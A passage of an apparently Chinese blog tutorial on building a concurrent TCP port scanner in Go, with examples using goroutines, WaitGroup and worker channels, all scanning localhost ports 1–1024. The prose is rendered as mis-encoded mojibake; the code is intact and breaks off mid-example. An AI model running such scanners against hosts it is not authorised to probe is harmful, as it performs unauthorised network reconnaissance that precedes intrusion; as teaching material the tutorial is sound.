<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">address</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;127.0.0.1:%d&#34;</span>, <span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Connect port:%d failed\n&#34;</span>, <span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
</span></span><span style="display:flex;"><span>		}
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;port:%d Open\n&#34;</span>, <span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="13-å¹¶å‘æ‰«æ">1.3 å¹¶å‘æ‰«æ<a hidden class="anchor" aria-hidden="true" href="#13-å¹¶å‘æ‰«æ">#</a></h3>
<p>ä»ä¸Šä¾‹æ‰«æå¯çŸ¥ï¼Œæ‰«æé€Ÿåº¦ç‰¹æ…¢ï¼Œæ‰€ä»¥å¯ä»¥é‡‡å–å¹¶å‘æ“ä½œã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">j</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">address</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;127.0.0.1:%d&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;Connect port:%d failed\n&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;port:%d Open\n&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>		}(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ä½†æ˜¯è¿™é‡Œå¦‚æœ ç›´æ¥ä½¿ç”¨ go å…³é”®å­—ï¼Œä¼šä¸ºæ¯ä¸ªè¿æ¥å¯åŠ¨ä¸€ä¸ª goroutine è€Œä¸» goroutine å¹¶ä¸çŸ¥é“è¦ç­‰å¾…è¿æ¥å‘ç”Ÿã€‚å› æ­¤ï¼Œä»£ç ä¼šåœ¨forå¾ªç¯å®Œæˆå…¶è¿­ä»£åç«‹å³å®Œæˆå¹¶é€€å‡ºï¼Œè¿™å¯èƒ½æ¯”ä»£ç ä¸ç›®æ ‡ç«¯å£ä¹‹é—´çš„æ•°æ®åŒ…ç½‘ç»œäº¤æ¢è¿˜è¦å¿«ã€‚å¯¹äºæ•°æ®åŒ…ä»åœ¨è¿è¡Œä¸­çš„ç«¯å£ï¼Œå¯èƒ½æ— æ³•è·å¾—å…¶å‡†ç¡®çš„ç»“æœï¼Œå› æ­¤æˆ‘ä»¬å¾—é‡‡å–ä¸€äº›æ–¹æ³•è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<h4 id="131-ä½¿ç”¨-waitgroup-è¿›è¡ŒåŒæ­¥æ‰«æ">1.3.1 ä½¿ç”¨ WaitGroup è¿›è¡ŒåŒæ­¥æ‰«æ<a hidden class="anchor" aria-hidden="true" href="#131-ä½¿ç”¨-waitgroup-è¿›è¡ŒåŒæ­¥æ‰«æ">#</a></h4>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;sync&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;time&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">t</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Now</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wg</span> <span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">j</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Done</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">address</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;127.0.0.1:%d&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">//fmt.Printf(&#34;Connect port:%d failed\n&#34;, j)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;port:%d Open\n&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>		}(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Wait</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">time</span>.<span style="color:#a6e22e">Since</span>(<span style="color:#a6e22e">t</span>))
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>è¯¥ç¨‹åºæ¯”åˆå§‹ç‰ˆæœ¬æœ‰äº†è¿›æ­¥ï¼Œä½†ä»ç„¶ä¸ç®—æ˜¯æ­£ç¡®çš„ã€‚å¦‚æœå¯¹å¤šä¸ªä¸»æœºå¤šæ¬¡æ‰§è¡Œæ­¤ç¨‹åºï¼Œåˆ™å¯èƒ½ä¼šçœ‹åˆ°<strong>ä¸ä¸€è‡´çš„ç»“æœ</strong>ã€‚åŒæ—¶æ‰«æè¿‡å¤šçš„ä¸»æœºæˆ–ç«¯å£<strong>å¯èƒ½ä¼šå¯¼è‡´ç½‘ç»œæˆ–ç³»ç»Ÿé™åˆ¶</strong>ï¼Œé€ æˆç»“æœä¸æ­£ç¡®ã€‚ä½ å¯ä»¥å°è¯•å°† 1024 æ›´æ”¹ä¸º 65535 å¹¶å°†ç›®æ ‡æœåŠ¡å™¨æ›´æ”¹ä¸ºæœ¬åœ°ä¸»æœº l27.0.0.1 ï¼Œç»“æœå¯èƒ½ä¼šå‘ç”Ÿé”™è¯¯ã€‚å¦‚æœ‰éœ€è¦ï¼Œå¯ä»¥ä½¿ç”¨Wiresharkæˆ–tcpdumpæŸ¥çœ‹æ‰“å¼€è¿™äº›è¿æ¥çš„é€Ÿåº¦ã€‚</p>
<h4 id="132-ä½¿ç”¨äººå·¥æ± è¿›è¡Œç«¯å£æ‰«æ">1.3.2 ä½¿ç”¨äººå·¥æ± è¿›è¡Œç«¯å£æ‰«æ<a hidden class="anchor" aria-hidden="true" href="#132-ä½¿ç”¨äººå·¥æ± è¿›è¡Œç«¯å£æ‰«æ">#</a></h4>
<h5 id="1321-å•é€šé“é€šä¿¡">1.3.2.1 å•é€šé“é€šä¿¡<a hidden class="anchor" aria-hidden="true" href="#1321-å•é€šé“é€šä¿¡">#</a></h5>
<p>ä¸ºé¿å…ç»“æœä¸ä¸€è‡´ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨ goroutine æ± ç®¡ç†æ­£åœ¨è¿›è¡Œçš„å¹¶å‘å·¥ä½œã€‚ä½¿ç”¨ for å¾ªç¯åˆ›å»ºä¸€å®šæ•°é‡çš„å·¥äºº goroutine ä½œä¸ºèµ„æºæ± ï¼›ç„¶åï¼Œåœ¨ main() çº¿ç¨‹ä¸­ä½¿ç”¨é€šé“æä¾›å·¥ä½œã€‚</p>
<p>é¦–å…ˆï¼Œåˆ›å»ºä¸€ä¸ªæ–°ç¨‹åºï¼Œè¯¥ç¨‹åºæœ‰ l00 ä¸ª worker ,ä½¿ç”¨ä¸€ä¸ª int é€šé“å°†å®ƒä»¬æ‰“å°åˆ°å±å¹•ä¸Šã€‚ç»§ç»­ä½¿ç”¨ WaitGroup é˜»å¡æ‰§è¡Œã€‚</p>
<p>å‡½æ•° worker(ports chan int, * sync.WaitGroup) æœ‰ä¸¤ä¸ªå‚æ•°ï¼šint ç±»å‹çš„é€šé“å’ŒæŒ‡å‘ WaitGroup çš„æŒ‡é’ˆã€‚é€šé“ç”¨äºæ¥æ”¶å·¥ä½œï¼Œè€ŒWaitGroupåˆ™ç”¨äºè·Ÿè¸ªå•ä¸ªå·¥ä½œçš„å®Œæˆæƒ…å†µã€‚</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;sync&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">wg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">ports</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Println</span>(<span style="color:#a6e22e">p</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Done</span>()
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ports</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#ae81ff">100</span>) <span style="color:#75715e">// make ä¸€ä¸ªå®¹é‡ä¸º 100 çš„ç¼“å†²é€šé“
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wg</span> <span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> &lt; cap(<span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> { <span style="color:#75715e">//å¯åŠ¨æ‰€éœ€æ•°é‡çš„å·¥äººçº¿ç¨‹,ä½†è¿™æ—¶å·¥äººå°šæœªå·¥ä½œ
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">wg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> { <span style="color:#75715e">// éå†ç«¯å£é€å…¥é€šé“ ports ä¸­
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>		<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ports</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">i</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Wait</span>()
</span></span><span style="display:flex;"><span>	close(<span style="color:#a6e22e">ports</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>é¦–å…ˆ make ä¸€ä¸ªå®¹é‡ä¸º 100 çš„ç¼“å†²é€šé“ï¼Œè¿™æ„å‘³ç€å¯ä»¥åœ¨ä¸ç­‰å¾…æ¥æ”¶å™¨è¯»å–æ•°æ®çš„æƒ…å†µä¸‹å‘å…¶å‘é€æ•°æ®ï¼ŒåŒæ—¶ç¼“å†²é€šé“ä¹Ÿå¯ä»¥å¾ˆå¥½åœ°ç”¨æ¥ç»´æŠ¤å’Œè·Ÿè¸ªå¤šä¸ªç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…çš„å·¥ä½œã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œä½¿ç”¨ for å¾ªç¯å¯åŠ¨æ‰€éœ€æ•°é‡çš„å·¥äººçº¿ç¨‹ï¼Œåœ¨å‡½æ•° worker(ports chan int, * sync.WaitGroup)ä¸­ï¼Œä½¿ç”¨ range è¿ç»­åœ°ä»é€šé“ ports æ¥æ”¶æ•°æ®ï¼Œç›´åˆ°è¯¥é€šé“è¢«å…³é—­ã€‚æ³¨æ„ï¼Œè¿™æ—¶å·¥äººå°šæœªå¼€å§‹ä»»ä½•å·¥ä½œã€‚åœ¨å‡½æ•° main() ä¸­ä¾æ¬¡éå†è¦æ‰«æçš„ç«¯å£é€å…¥é€šé“ ports ä¸­,ç„¶åå°†é€šé“ ports ä¸­çš„ä¸€ä¸ªç«¯å£å‘é€ç»™å·¥äººã€‚å®Œæˆæ‰€æœ‰å·¥ä½œåï¼Œå…³é—­é€šé“ ã€close(ports)ã€‘ã€‚</p>
<p>ç¼–å†™å¹¶æ‰§è¡Œè¯¥ç¨‹åºåï¼Œä½ ä¼šåœ¨å±å¹•ä¸Šçœ‹åˆ°ç›¸åº”çš„æ•°å­—ã€‚ä¸è¿‡ï¼Œä½ å¯èƒ½ä¼šæ³¨æ„åˆ°ä¸€ä¸ªæœ‰è¶£çš„ç°è±¡ï¼šæ•°å­—ä¸æ˜¯ä»¥ç‰¹å®šçš„é¡ºåºæ‰“å°çš„ã€‚æ¬¢è¿æ¥åˆ°ç²¾å½©çš„å¹¶è¡Œä¸–ç•Œã€‚</p>
<p>ç»“åˆç«¯å£æ‰«æï¼š</p>
<p><img loading="lazy" src="image-20230108185925959.png" alt="image-20230108185925959"  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;sync&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#a6e22e">wg</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">ports</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#66d9ef">func</span>(<span style="color:#a6e22e">j</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">defer</span> <span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Done</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">address</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;127.0.0.1:%d&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">Dial</span>(<span style="color:#e6db74">&#34;tcp&#34;</span>, <span style="color:#a6e22e">address</span>)
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>				<span style="color:#75715e">//fmt.Printf(&#34;Connect port:%d failed\n&#34;, j)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>				<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>			}
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">conn</span>.<span style="color:#a6e22e">Close</span>()
</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Printf</span>(<span style="color:#e6db74">&#34;port:%d Open\n&#34;</span>, <span style="color:#a6e22e">j</span>)
</span></span><span style="display:flex;"><span>		}(<span style="color:#a6e22e">p</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ports</span> <span style="color:#f92672">:=</span> make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>, <span style="color:#ae81ff">100</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wg</span> <span style="color:#a6e22e">sync</span>.<span style="color:#a6e22e">WaitGroup</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span> &lt; cap(<span style="color:#a6e22e">ports</span>); <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">go</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">wg</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">:=</span> <span style="color:#ae81ff">1</span>; <span style="color:#a6e22e">i</span> <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">1024</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Add</span>(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ports</span> <span style="color:#f92672">&lt;-</span> <span style="color:#a6e22e">i</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">wg</span>.<span style="color:#a6e22e">Wait</span>()
</span></span><span style="display:flex;"><span>	close(<span style="color:#a6e22e">ports</span>)
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>è¿™æ ·å¹¶å‘ç«¯å£æ‰«æå™¨å°±å¯ä»¥æ­£å¸¸å·¥ä½œï¼Œä½†æ˜¯ï¼Œæ‰“å°åˆ°å±å¹•çš„ç«¯å£å°†æ— æ³•æ’åºï¼Œå› ä¸ºè¯¥ç«¯å£æ‰«æå™¨ä¸ä¼šæ£€æŸ¥å®ƒä»¬çš„é¡ºåºã€‚</p>
<h5 id="1322-å¤šé€šé“é€šä¿¡">1.3.2.2 å¤šé€šé“é€šä¿¡<a hidden class="anchor" aria-hidden="true" href="#1322-å¤šé€šé“é€šä¿¡">#</a></h5>
<p>è¦è§£å†³ä¸Šé¢è¿™ä¸ªé—®é¢˜ï¼Œä½ éœ€è¦ä½¿ç”¨å•ç‹¬çš„çº¿ç¨‹å°†ç«¯å£æ‰«æçš„ç»“æœä¼ å›ä¸»çº¿ç¨‹ï¼Œä»¥ä¾¿åœ¨æ‰“å°ä¹‹å‰å¯¹ç«¯å£è¿›è¡Œæ’åºã€‚è¿™æ ·ä¿®æ”¹çš„å¦ä¸€ä¸ªå¥½å¤„æ˜¯ï¼Œå¯ä»¥å®Œå…¨æ¶ˆé™¤å¯¹ WaitGroup çš„ä¾èµ–ï¼Œå› ä¸ºæˆ‘ä»¬å°†ä½¿ç”¨å¦ä¸€ç§è·Ÿè¸ªå®Œæˆæƒ…å†µçš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‰«æ1024ä¸ªç«¯å£ï¼Œåˆ™è¦åœ¨å·¥äººé€šé“ä¸Šå‘é€1024æ¬¡ï¼Œå¹¶ä¸”éœ€è¦å°†è¯¥å·¥ä½œçš„ç»“æœå‘é€å›ä¸»çº¿ç¨‹1024æ¬¡ã€‚ç”±äºå‘é€çš„å·¥ä½œå•å…ƒæ•°é‡å’Œæ”¶åˆ°çš„ç»“æœæ•°é‡ç›¸åŒï¼Œå› æ­¤ç¨‹åºå¯ä»¥çŸ¥é“ä½•æ—¶å…³é—­é€šé“å¹¶éšåå…³é—­å·¥äººçº¿ç¨‹ã€‚</p>
<p><img loading="lazy" src="image-20230108184538984.png" alt="image-20230108184538984"  />
</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;sort&#34;</span>
</span></span><span style="display:flex;"><span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">worker</span>(<span style="color:#a6e22e">ports</span>, <span style="color:#a6e22e">results</span> <span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">int</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> <span style="color:#a6e22e">p</span> <span style="color:#f92672">:=</span> <span style="color:#66d9ef">range</span> <span style="color:#a6e22e">ports</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">address</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#e6db74">&#34;127.0.0.1:%d&#34;</span>, <span style="color:#a6e22e">p</span>)
